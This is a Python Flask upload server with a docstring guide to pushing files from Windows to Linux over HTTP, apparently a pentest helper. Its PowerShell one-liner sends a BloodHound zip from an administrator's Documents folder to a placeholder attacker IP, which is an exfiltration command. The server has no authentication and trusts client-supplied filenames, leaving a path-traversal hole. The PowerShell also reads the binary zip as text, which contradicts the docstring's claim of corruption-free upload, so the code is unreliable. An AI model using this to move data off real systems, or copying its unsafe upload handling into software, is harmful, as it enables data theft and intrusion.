"""
File Upload from Windows to Linux Using HTTP

Step 1: Install Flask (if not already installed)
-----------------------------------------------
Run the following command on your Linux machine to install Flask:
    pip3 install flask

Step 2: Start the Upload Server
--------------------------------
Run this script on your Linux machine:
    python3 upload_server.py
This starts an HTTP server on port 8000 that accepts file uploads.

Step 3: Upload a File from Windows Using PowerShell
----------------------------------------------------
Run the following PowerShell one-liner on your Windows machine, replacing the file path and Linux IP:
    $filePath = "C:\users\administrator\documents\20241228202930_BloodHound.zip"; 
    $boundary = [System.Guid]::NewGuid().ToString(); 
    $body = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"`r`n`r`n$(Get-Content $filePath -Raw)`r`n--$boundary--"; 
    Invoke-RestMethod -Uri "http://<linux-ip>:8000/upload" -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"

Replace `<linux-ip>` with the IP address of the Linux machine and `<file-path>` with the full path to your file.

Step 4: Verify the Upload
--------------------------
Check the directory where this script is running. The uploaded file will appear there:
    ls -l

Troubleshooting
---------------
- Ensure port 8000 is open on the Linux machine.
- Use `ip a` to find the IP address of the Linux machine.
"""

from flask import Flask, request
import base64
import os

# Create a Flask application instance
app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload_file():
    """
    Endpoint to handle file uploads.

    This method saves the uploaded file in binary mode to prevent corruption.
    """
    # Get the file from the HTTP POST request
    file = request.files.get('file')
    if not file:
        return "No file part in the request", 400

    # Save the file in binary mode
    try:
        file.save(os.path.join("./", file.filename))
        return f"File {file.filename} uploaded successfully"
    except Exception as e:
        return f"Error saving file: {str(e)}", 500

@app.route('/upload-base64', methods=['POST'])
def upload_file_base64():
    """
    Endpoint to handle Base64-encoded file uploads.

    The uploaded file is decoded from Base64 and saved to the current directory.
    """
    data = request.json.get('file')
    if not data:
        return "No file data in the request", 400

    try:
        file_content = base64.b64decode(data)
        filename = request.json.get('filename', 'uploaded_file')
        with open(filename, "wb") as f:
            f.write(file_content)
        return f"File {filename} uploaded and decoded successfully"
    except Exception as e:
        return f"Error decoding or saving file: {str(e)}", 500

if __name__ == "__main__":
    """
    Start the Flask server.

    The server listens on all interfaces (0.0.0.0) and port 8000 by default.
    """
    app.run(host="0.0.0.0", port=8000)
